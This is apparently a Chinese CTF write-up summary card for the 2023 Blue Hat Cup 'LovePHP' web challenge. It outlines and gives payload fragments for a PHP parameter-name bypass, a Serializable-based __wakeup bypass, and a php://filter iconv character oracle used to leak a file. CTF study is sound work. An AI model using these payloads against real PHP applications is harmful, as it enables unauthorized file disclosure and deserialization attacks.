---
title: "第七届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"
category: web
tags: ["第七届蓝帽杯初赛", "web", "蓝帽杯", "LovePHP反序列化", "file($_GET['secret'])", "my[secret.flag绕过["]
signals: ["第七届蓝帽杯初赛 2023", "蓝帽杯", "LovePHP反序列化", "file($_GET['secret'])", "my[secret.flag绕过[", "__wakeup绕过", "Serializable接口", "php://filter字符oracle", "deserialize", "LovePHP", "secret", "flag", "Serializable", "wakeup"]
difficulty: medium
source: "https://www.ctfiot.com/132309.html"
tools: ["C"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第七届蓝帽杯全国大学生网络安全技能大赛初赛Writeup

> 赛事：第七届蓝帽杯初赛 2023 | 方向：web | 难度：medium | 工具：C

## 一句话总结

第七届蓝帽杯初赛LovePHP：my[secret.flag绕过+Serializable接口绕过__wakeup+php://filter字符oracle

## 攻击链

1. ?my[secret.flag= (绕过[变_)→C:8:"Saferman":0:{} (Serializable接口绕过__wakeup)→file($_GET['secret'])→php://filter字符oracle爆flag

## 关键 payload

```
my[secret.flag绕过[;C:8:"Saferman":0:{} Serializable接口绕过__wakeup;file($_GET['secret']);php://filter convert.iconv.L1.UCS-4LE爆字符串长度
```

## 经验教训

GET参数名中[被替换为_→用my[secret.flag绕过；Serializable接口类不再支持__wakeup

## 标签

蓝帽杯、LovePHP反序列化、file($_GET['secret'])、my[secret.flag绕过[、__wakeup绕过、Serializable接口、php://filter字符oracle

## 参考来源

- https://www.ctfiot.com/132309.html
- 原文件：第七届蓝帽杯全国大学生网络安全技能大赛初赛Writeup.full.md
